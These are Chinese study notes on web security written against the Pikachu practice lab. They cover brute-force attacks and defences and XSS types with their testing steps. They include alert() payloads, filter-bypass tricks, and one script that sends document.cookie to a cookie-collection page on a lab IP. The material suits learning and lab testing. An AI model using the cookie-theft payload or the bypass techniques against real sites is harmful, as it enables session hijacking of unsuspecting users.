# Web安全


## 暴力破解漏洞

暴力破解 = 连续性尝试 + 字典+ 自动化

### 有效的字典

>- 弱口令
>- 社工库，已收集的账号密码，比如脱裤收集的，可以撞库
>- 使用指定字符利用工具按照规则生成密码
>- 常用账户密码，如admin/root
>- 遵循注册时的密码要求

### 漏洞测试流程

> - 确认暴力破解的可能性，如抓包
> - 优化字典，如密码限定字符、长度
> - 配置自动化工具，如超时时间、重试次数
>
> - [常见字典](https://github.com/danielmiessler/SecLists)
> - 注意事项：字典导入时不能有中文路径

### 验证码

> - 作用
>   - 登陆暴力破解
>   - 防止机器恶意注册
> - 认证流程
>   - 登陆页面，后台生成验证码，同时使用算法生成图片，并将图片response给客户端，同时将算法生成的值全局赋值存到 SESSION中
>   - 校验验证码，客户端将认证信息和验证码一同提交，后台对提交的验证码与 SESSION里面的验证码进行比较
>   - 客户端重新刷新页面，再次生成新的验证码，验证码算法中一般包含随机函数，所以每次刷新都会改变
> - 不安全验证码 - 客户端
>   - 使用前端js实现验证码(纸老虎)
>   - 验证码在cookie容易泄露，可被获取
>   - 将验证码在前端源代码中泄露，容易被获取
> - 不安全验证码 - 服务端
>   - 验证码在后台不过期，导致可以长期被使用
>   - 验证码校验不严格，逻辑出现问题
>   - 验证码设计的太过简单或者有规律，容易被猜解
>   - session？

### 防范措施

> - 设计安全的验证码（安全的流程 + 复杂而又可用的图形）
> - 对认证错误的提交进行计数并给出限制，比如连续5次密码错误，锁定2小时
> - 必要的情况下，使用双因素认证
> - token对防止暴力破解没有用

------



## 跨站脚本漏洞 - XSS

### 跨站脚本漏洞概述

> - XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在 OWASP TOP10的排名前三
>
> - XSS是一种发生在Web前端的漏洞，所以其危害的对象也主要是前端用户
>
> - XSS漏洞可以用来进行钓鱼攻击、前端js挖矿、用户 cookie 获取。甚至可以结合浏览自身的漏洞对用户主机进行远程控制
>
> - 常见类型
>
>   - 反射型，交互的数据一般不会被存在在数据库里面，一次性，一般岀现在查询类页面等
>   - 存储型，存储在数据库里面，永久性，一般岀现在留言板，注册等页面
>   - DOM型，不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性，也属于反射型
>
> - 漏洞形成原因
>
>   主要原因是程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输到前端时被浏览器当作有效代码解析执行从而产生危害
>
> - 测试流程
>
>   - 在目标站点上找到输入点，比如查询接口，留言板等
>   - 输入一组“特殊字符 + 唯一识别字符”，点击提交后，查看返回的源码，是否有做对应的处理
>   - 通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件（构造闭合）
>   - 提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执行则说明存在XS漏洞
>
> - TIPS
>
>   - 一般查询接口容易出现反射型XSS，留言板容易岀现存储型XSS
>   - 由于后台可能存在过滤措施，构造的script可能会被过滤掉，而无法生效，或者环境限制了执行(浏览器)
>   - 通过变化不同的script，尝试绕过后台过滤机制

### 反射型XSS(get)

该测试中，前台未进行输入限制，后台未进行输入转义，导致js脚本正常执行，构成反射性XSS

```
<p class='notice'>who is <script>alert('xss')</script>,i don't care!</p> 
```
对于get型XSS，payload直接放在url中

```
http://192.168.43.65/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&submit=submit
```

> - GET方式的XSS漏洞更加容易被利用，一般利用的方式是将带有跨站脚本的url伪装后发送给目标，而POST方式由于是以表单方式提交，无法直接使用URL方式进行攻击
> - GET和POST典型区别：GET是以url方式提交数据，POST是以表单方式在请求体里面提交

### 存储型XSS

存储型XSS漏洞跟反射型形成的原因一样，不同的是存储型XSS下攻击者可以将脚本注入到后台存储起来，构成更加持久的危害，因此存储型XSS也称“永久型”XSS。

```
<p class='con'><script>alert('xss')</script></p>
```

```
http://192.168.43.65/pikachu/vul/xss/xss_stored.php
```

### DOM型XSS

[DOM举例](https://www.w3school.com.cn/tiy/t.asp?f=hdom_document_getbyid)

```
源码：<a href='"+str+"'>what do you see?</a>
payload：#' onclick="alert('xss')"/>
闭合：<a href='#' onclick="alert('xss')"/>'>what do you see?</a>
```

### 案例1：GET型XSS获取cookie

```
# 注意pkxss的路径
<script>document.location = 'http://192.168.43.65/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>
```

```
192.168.43.65/pikachu/vul/xss/xss_reflected_get.php?message=<script>document.location+%3D+'http%3A%2F%2F192.168.43.65%2Fpikachu%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D'+%2B+document.cookie%3B<%2Fscript>&submit=submit
```

[什么是cookie？](https://www.jianshu.com/p/6fc9cea6daa2)

### 案例2：POST型XSS获取cookie

### 案例3：XSS钓鱼 - basic认证

### 案例4：XSS键盘记录

>**什么是跨域？**
>
>| http:// | www.   | xyz.com: | 8080 | /script/test.js |
>| ------- | ------ | -------- | ---- | --------------- |
>| 协议    | 子域名 | 主域名   | 端口 | 资源地址        |
>
>当协议、主机（主域名,子域名）、端口中的任意一个不相同时，称为不同域。我们把不同的域之间请求数据的操作，称为跨域操作。

> **跨域-同源策略**
>
> 为了安全考虑，所有的浏览器都约定了“同源策略”,，同源策略规定，两个不同域名之间不能使用JS进行相互操作。
>
> 比如: x.com域名下的javascript并不能操作y.com域下的对象。
>
> 如果想要跨域操作,则需要管理员进行特殊的配置。

### XSS盲打

> 用户提交信息，推测后台管理员会看，输出在管理员看到的页面。获取管理员cookie，冒充管理员在后台为所欲为。

### XSS绕过-过滤-转换

> 1. 前端限制绕过,直接抓包重放,或者修改html前端代码
> 2. 大小写,比如:<SCriPt>
> 3. 拼凑:<scr<script>ipt>
> 4. 使用注释进行干扰:<scri<!--test-->pt>

### XSS绕过-过滤-编码

> 核心思路:
>
> 后台过滤了特殊字符,比如<script>标签,但该标签可以被各种编码,后台不一定会过滤,当浏览器对该编码进行识别时,会翻译成正常的标签，从而执行.
>
> 注意:在使用编码时需要注意编码在输出点是否会被正常识别和翻译.
>
> 例子:
>
> <img src=x onerror=”alert('xss')" />可以把alert("xss")进行html编码
> <img src=x onerror "&#97;&# 108;&# 101;&# 114;&# 116;&#40;&#39;&# 120;&# 115;&# 115;&#39;&#41;



### XSS绕过-htmlspecialchars()使用

### XSS实战练习

> xss-lab，放在xmapp的htdocs文件夹中，打开apache，访问即可。

---

## 相关链接
[视频教程](https://www.ichunqiu.com/course/63838)[|靶场](https://github.com/zhuifengshaonianhanlu/pikachu)